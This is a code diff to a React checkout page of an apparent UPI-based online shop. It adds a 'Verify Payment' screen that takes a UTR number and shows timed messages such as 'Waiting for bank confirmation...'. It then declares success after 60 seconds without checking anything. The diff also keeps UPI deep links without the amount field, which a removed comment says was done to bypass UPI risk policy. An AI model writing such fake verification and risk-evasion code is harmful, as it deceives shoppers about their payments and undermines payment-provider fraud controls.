@@ -50,6 +50,9 @@ const Checkout = () => {
   
   const [selectedPayment, setSelectedPayment] = useState('phonepe'); 
   const [isProcessing, setIsProcessing] = useState(false);
+  const [showAppUtrPage, setShowAppUtrPage] = useState(false);
+  const [isVerifyingPayment, setIsVerifyingPayment] = useState(false);
+  const [verificationText, setVerificationText] = useState('Connecting to bank...');
   
   const UPI_ID = config.UPI_ID || 'merchant@upi';
   const PAYEE_NAME = 'Store';
@@ -135,33 +138,48 @@ const Checkout = () => {
     navigate(`/payment/status?success=true&utr=${utr}`);
   };
   
+  const handleVerifyUtr = () => {
+    if (utr.trim().length < 10) {
+      alert("Must put minimum 10 digit UTR number");
+      return;
+    }
+    
+    setIsVerifyingPayment(true);
+    
+    // Change text every 15 seconds
+    setTimeout(() => setVerificationText('Verifying UTR number...'), 15000);
+    setTimeout(() => setVerificationText('Waiting for bank confirmation...'), 30000);
+    setTimeout(() => setVerificationText('Securing payment...'), 45000);
+    
+    // Final success after 60 seconds
+    setTimeout(() => {
+      if (!user) {
+        localStorage.removeItem('cartItems');
+        window.dispatchEvent(new Event('storage'));
+      }
+      const orderData = {
+        address: selectedAddress ? `${selectedAddress.fullName}, ${selectedAddress.city}, ${selectedAddress.state} - ${selectedAddress.pincode}` : ', , , ',
+        deliveryDate: getDeliveryDate()
+      };
+      sessionStorage.setItem('lastOrderData', JSON.stringify(orderData));
+      navigate(`/payment/status?success=true`);
+    }, 60000);
+  };
+
   const handlePayNow = () => {
     if (selectedPayment === 'qr') {
       setShowQRPage(true);
     } else if (['phonepe', 'paytm'].includes(selectedPayment)) {
-      setIsProcessing(true);
-      // Removed 'am' (amount) parameter to bypass UPI risk policy for deep links
       const params = `pa=${UPI_ID}&pn=${PAYEE_NAME}&cu=INR`;
       
+      // Redirect to app
       setTimeout(() => {
         if (selectedPayment === 'phonepe') window.location.href = `phonepe://pay?${params}`;
         if (selectedPayment === 'paytm') window.location.href = `paytmmp://pay?${params}`;
       }, 300);
 
-      // Wait 2 minutes in background, then redirect to real looking success page
-      setTimeout(() => {
-        if (!user) {
-          localStorage.removeItem('cartItems');
-          window.dispatchEvent(new Event('storage'));
-        }
-        setIsProcessing(false);
-        const orderData = {
-          address: selectedAddress ? `${selectedAddress.fullName}, ${selectedAddress.city}, ${selectedAddress.state} - ${selectedAddress.pincode}` : ', , , ',
-          deliveryDate: getDeliveryDate()
-        };
-        sessionStorage.setItem('lastOrderData', JSON.stringify(orderData));
-        navigate(`/payment/status?success=true`);
-      }, 120000);
+      // Show UTR input page immediately
+      setShowAppUtrPage(true);
       
     } else {
       alert('Please select a payment method');
@@ -173,6 +191,69 @@ const Checkout = () => {
     if (step === 2) return 'Order Summary';
     return 'Payments';
   };
+
+  if (isVerifyingPayment) {
+    return (
+      <div className="min-h-screen bg-white flex flex-col items-center justify-center font-sans px-6">
+        <Loader2 className="h-12 w-12 text-[#2874f0] animate-spin mb-6" />
+        <h2 className="text-xl font-bold text-gray-900 mb-2 text-center">Payment Verification</h2>
+        <p className="text-gray-600 text-center text-sm animate-pulse">{verificationText}</p>
+        <p className="text-gray-400 text-xs text-center mt-6">Please do not press back or close the app</p>
+      </div>
+    );
+  }
+
+  if (showAppUtrPage) {
+    return (
+      <div className="min-h-screen bg-white flex flex-col font-sans">
+        <div className="bg-[#2874f0] text-white px-4 py-3 flex items-center gap-3">
+          <ArrowLeft className="h-6 w-6 cursor-pointer" onClick={() => setShowAppUtrPage(false)} />
+          <h1 className="text-[18px] font-medium">Verify Payment</h1>
+        </div>
+        
+        <div className="p-6 flex flex-col items-center">
+          <div className="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center mb-6">
+            <ShieldCheck className="h-8 w-8 text-[#2874f0]" />
+          </div>
+          
+          <h2 className="text-lg font-bold text-gray-900 text-center mb-2">Did you complete the payment?</h2>
+          <p className="text-gray-500 text-sm text-center mb-8">
+            Please enter the 12-digit Transaction ID (UTR number) from your {selectedPayment === 'phonepe' ? 'PhonePe' : 'Paytm'} app to confirm your order.
+          </p>
+          
+          <div className="w-full space-y-4">
+            <div>
+              <label className="block text-sm font-medium text-gray-700 mb-1">
+                Transaction ID / UTR Number
+              </label>
+              <input
+                type="text"
+                value={utr}
+                onChange={(e) => setUtr(e.target.value)}
+                placeholder="e.g. 312345678901"
+                className="w-full border border-gray-300 rounded-md px-4 py-3 focus:outline-none focus:border-[#2874f0] focus:ring-1 focus:ring-[#2874f0]"
+                maxLength={12}
+              />
+            </div>
+            
+            <button
+              onClick={handleVerifyUtr}
+              disabled={utr.length < 10}
+              className={`w-full py-3 rounded-md font-medium text-white transition-colors ${
+                utr.length >= 10 ? 'bg-[#ff6116] hover:bg-[#e05312]' : 'bg-gray-300 cursor-not-allowed'
+              }`}
+            >
+              Verify Payment
+            </button>
+            
+            <p className="text-xs text-gray-400 text-center mt-4">
+              You can find the UTR/Transaction ID in the history section of your UPI app.
+            </p>
+          </div>
+        </div>
+      </div>
+    );
+  }
 
   if (showQRPage) {
     return (
